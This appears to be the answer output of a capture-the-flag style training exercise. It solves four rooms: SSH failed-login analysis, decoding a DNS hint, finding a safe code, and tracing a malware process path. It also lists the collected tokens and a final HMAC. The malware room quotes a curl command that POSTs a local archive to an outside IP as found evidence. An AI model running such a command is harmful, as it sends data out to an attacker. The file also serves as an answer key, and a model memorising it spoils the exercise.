@@ -1,0 +1,42 @@
+[Room SOC] Parsing logs...
+63 failed attempts found in 192.0.2.0/24
+Top IP is 192.0.2.81 (last octet=81)
+Token formed: 8163
+
+TOKEN[KEYPAD]=8163
+EVIDENCE[KEYPAD].TOP24=192.0.2.0/24
+EVIDENCE[KEYPAD].COUNT=63
+EVIDENCE[KEYPAD].SAMPLE_RECORD=2026-10-05T09:00:04Z lab1 sshd[2104]: Failed password for deploy from 192.0.2.22 port 52736 protocol 2
+EVIDENCE[KEYPAD].MALFORMED_SKIPPED=3
+
+[Room DNS] Decoding hints...
+Decoded line : The authoritative hint ends at beacon.
+Token formed: beacon
+
+TOKEN[DNS]=beacon
+EVIDENCE[DNS].KEY=hint1
+EVIDENCE[DNS].ENCODING=rot13+b64
+EVIDENCE[DNS].DECODED_LINE=The authoritative hint ends at beacon.
+
+[Room Vault] Scanning dump...
+Found candidate: SAFE { 6-19 - 25 }
+Checksum: 6+19=25 (OK)
+
+TOKEN[SAFE]=6-19-25
+EVIDENCE[SAFE].MATCH="SAFE { 6-19 - 25 }"
+EVIDENCE[SAFE].CHECK=6+19=25
+
+[Room Malware] Building graph...
+Exfil path found: 2903->4659->7929->8696->9109
+Terminal command: curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz
+
+TOKEN[PID]=9109
+EVIDENCE[PID].PATH=[2903->4659->7929->8696->9109]
+EVIDENCE[PID].CMD="curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz"
+EVIDENCE[PID].MALFORMED_SKIPPED=1
+
+Collected tokens: KEYPAD=8163, DNS=beacon, SAFE=6-19-25, PID=9109
+FINAL_GATE=OPEN
+MSG=group01|8163-9109-beacon-6-19-25
+HMAC=41a84c028ef387a76ce0225277d3079794ba695df4bfe705064e8e76304838e3
+
